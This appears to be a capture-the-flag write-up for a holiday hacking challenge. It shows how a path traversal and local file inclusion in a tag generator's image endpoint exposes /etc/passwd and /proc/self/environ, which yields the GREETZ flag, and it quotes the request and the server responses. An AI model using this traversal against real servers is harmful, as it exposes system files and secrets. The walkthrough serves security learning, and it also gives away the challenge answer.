# 8) Broken Tag Generator
Dificulty: 4/5

![Difficulty](../../img/Dificulty4.png)

Help Noel Boetie fix the Tag Generator (https://tag-generator.kringlecastle.com/) in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

ANSWER: JackFrostWasHere

![Access](8-Broken-Tag-Generator-access.png)

## Finding the vulnerability
After requesting the URL https://tag-generator.kringlecastle.com/image the server sends a hint of the possible vulnerability that is visible in the browser but curl or burp give more information, where we can see this response use `501` http status code.
```
HTTP/1.1 501 Not Implemented
Server: nginx/1.14.2
Date: Mon, 21 Dec 2020 02:22:22 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 80
Connection: close
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN

<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: ID is missing!</p>
```

Next request, lets attempt a LFI on the `id` parameter using a well-known file `/etc/passwd`, the request failed but the error message is different, this time the server sends a `404` not found with the message route not found in `/app/lib/app.rb`.
```
HTTP/1.1 404 Not Found
Server: nginx/1.14.2
Date: Mon, 21 Dec 2020 02:24:33 GMT
Content-Type: image/jpeg
Content-Length: 81
Connection: close
X-Content-Type-Options: nosniff

<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Route not found</p>
```

This means that the application may prepend a fixed string to our request so let's improve our previous request with a path traversal.
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 21 Dec 2020 02:30:00 GMT
Content-Type: image/jpeg
Content-Length: 966
Connection: close
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
app:x:1000:1000:,,,:/home/app:/bin/bash
```

Now we know that it sucessfully retrieves files from the file system, the target is to obtain the value of the `GREETZ` environmental variable. To get all environmental variables of the runnin process we can send the request to `https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ`
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 21 Dec 2020 02:33:44 GMT
Content-Type: image/jpeg
Content-Length: 399
Connection: close
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none

PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=cbf2810b7573 RUBY_MAJOR=2.7 RUBY_VERSION=2.7.0 RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343 GEM_HOME=/usr/local/bundle BUNDLE_SILENCE_ROOT_WARNING=1 BUNDLE_APP_CONFIG=/usr/local/bundle APP_HOME=/app PORT=4141 HOST=0.0.0.0 GREETZ=JackFrostWasHere HOME=/home/app 
```

ANSWER: JackFrostWasHere